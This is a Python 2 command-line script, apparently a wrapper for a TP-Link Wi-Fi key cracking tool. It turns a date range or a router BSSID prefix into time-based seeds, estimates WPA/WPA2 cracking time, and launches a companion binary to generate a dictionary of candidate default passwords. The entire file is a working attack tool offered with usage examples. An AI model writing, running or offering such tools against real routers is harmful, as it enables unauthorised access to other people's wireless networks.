#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import sys
import platform
import datetime

def main():
    def genSeed(t1):
        dt = t1 - datetime.datetime(1601, 1, 1, 0, 0, 0)
        t = dt.days*864000000000 + dt.seconds*10000000 + dt.microseconds*10

        tA = (t/2**32 + 0xFE624E21)
        tB = (t%2**32 + 0x2AC18000) % (1<<32)

        if tA >= (1<<32):
            tA += 1
            tA %= 1<<32

        r = (tA % 0x989680) * (2**32)
        r = ((r + tB) / 0x989680) % (2**31)
        return r


    def monthDays(month,year):
        if month in [11, 4, 6, 9]:
            return 30
        if month in [1, 3, 5, 7, 8, 10, 12]:
            return 31
        if year % 4 == 0 and year % 100 != 0:
            return 29
        if year % 400 == 0:
            return 29
        return 28


    def prettyBytes(size):
        for x in ['B','KB','MB','GB']:
            if size < 1024.0:
                return "%3.1f %s" % (size, x)
            size /= 1024.0
            

    def prettySeconds(time):
        for x in [[60.,'sec.'],[60.,'min.'],[24.,'hours'],[365.,'days']]:
            if time < x[0]:
                return "%3.1f %s" % (time, x[1])
            time /= x[0]



    timeA = datetime.datetime(2010,1,1,0,0,0)
    timeB = datetime.datetime.now()

    print "Usage:\nTPLink-GenKeysFinal [options...]"
    print "By: alexaltea123@gmail.com | functionmixer.blogspot.com"
    print "\nOptions:"
    print " --continue           Do not display the \"Continue?\" message.\n"
    print " --bssid XX:XX:XX     Use the release date of the router as starting date OR"
    print " --start DD/MM/YYYY   use a custom starting date OR"
    print "                      left it blank to use the default date (01/01/2010).\n"

    print " --end DD/MM/YYYY     Use a custom ending date OR"
    print "                      left it blank to use the current date (%02d/%02d/%02d)." % (timeB.day,timeB.month,timeB.year)

    print "\nExamples:"
    print " ./TPLink-GenKeysFinal --bssid 64:70:02 --end 13/02/2013   (Linux)"
    print " ./TPLink-GenKeysFinal --start 24/11/2011 --end 13/02/2013 (Linux)\n\n"


    print "Information:"
    for i in range(1,len(sys.argv)-1,2):
        if sys.argv[i] == "--bssid":
            found = False
            f = open("data.txt","rb")
            for router in f.readlines():
                router = router.split(",")
                if router[0] == sys.argv[i+1]:
                    found = True
                    if router[3] == "??/??/????":
                        print "[!] No known release date for this router. Using default date (01/01/2010)."
                        break
                    start = map(int, router[3].split("/"))
                    timeA = datetime.datetime(start[2],start[1],start[0],0,0,0)
                    break
            if not found:
                print "[!] Specified BSSID not found in database. Using default date (01/01/2010)."

        if sys.argv[i] == "--start":
            start = map(int, sys.argv[i+1].split("/"))
            timeA = datetime.datetime(start[2],start[1],start[0],0,0,0)

        if sys.argv[i] == "--end":
            start = map(int, sys.argv[i+1].split("/"))
            timeB = datetime.datetime(start[2],start[1],start[0],0,0,0)


    seedA = genSeed(timeA)
    seedB = genSeed(timeB)

    print " [*] Starting date:               %02d/%02d/%02d" % (timeA.day,timeA.month,timeA.year)
    print " [*] Ending date:                 %02d/%02d/%02d" % (timeB.day,timeB.month,timeB.year)
    print " [*] Initial seed:               ",seedA,"(0x"+hex(seedA)[2:].upper().replace('L','')+" in hexadecimal)"
    print " [*] Final date:                 ",seedB,"(0x"+hex(seedB)[2:].upper().replace('L','')+" in hexadecimal)"
    print " [*] Total seeds/passwords:      ",seedB-seedA+1
    print " [*] Size of dictionary:         ",prettyBytes(11*(seedB-seedA+1)),"(WPA/WPA2)"
    print " [*] Estimated time of cracking: ",prettySeconds((seedB-seedA+1)/20000),"(GPU) or",prettySeconds((seedB-seedA+1)/2000),"(CPU)"

    if not "--continue" in sys.argv:
        cont = raw_input("\nContinue? (y/n): ")
        if cont!="y":
            return 0

    if platform.system() == "Windows":
        print " [*] Executing: \"TPLink-GenKeys2.exe "+str(seedA)+" "+str(seedB)+" --reverse\""
        print " [!] Please be patient..."
        os.popen("TPLink-GenKeys2.exe "+str(seedA)+" "+str(seedB)+" --reverse")
    else:
        print " [*] Executing: \"./TPLink-GenKeys2 "+str(seedA)+" "+str(seedB)+" --reverse\""
        print " [!] Please be patient..."
        os.popen("./TPLink-GenKeys2 "+str(seedA)+" "+str(seedB)+" --reverse","w")
    
    print "\nFinished!"
    return 0
    
main()
